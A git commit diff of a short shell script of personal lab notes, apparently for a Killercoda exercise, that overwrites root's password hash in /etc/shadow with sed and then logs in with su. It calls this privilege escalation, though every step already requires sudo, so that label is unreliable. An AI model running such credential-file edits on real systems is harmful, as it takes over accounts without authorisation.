67e2a58026bef15f353ddafa18b1ae1330c539c1
FreeBSDKernel9-0 <coconutrepairs@gmail.com>
2026-08-31 18:01:53 +0100

    Got it.

--- General Linux Stuff (BusyBox embedded junk)/HashPaws.sh
+++ General Linux Stuff (BusyBox embedded junk)/HashPaws.sh
@@ -1,10 +1,13 @@
-# Hash Paws
+# Hash Paws (Killercoda)
 # Getting (root) by modifying /etc/shadow - Local Privilege Escalation 
+
+# LOL, get whois first, so you can get your string
+sudo apt install whois
 
 mkpasswd -m yescrypt "password123" # Boring example, but I used that.
 
 # Put this into /etc/shadow
-sudo sed -i 's|^root:[^:]*|root:$y$j9T$30Y5XDeswiBjb8xsY8DSU0$ywsipBozEEesKTsy.miPdN2SYhS1qidXHLbHruimFK8|' /etc/shadow
+sudo sed -i 's|^root:[^:]*|root:<string here>|' /etc/shadow # yescrypt makes a new string, even if same password, so paste it
 
 # Log in, use your string
 su root
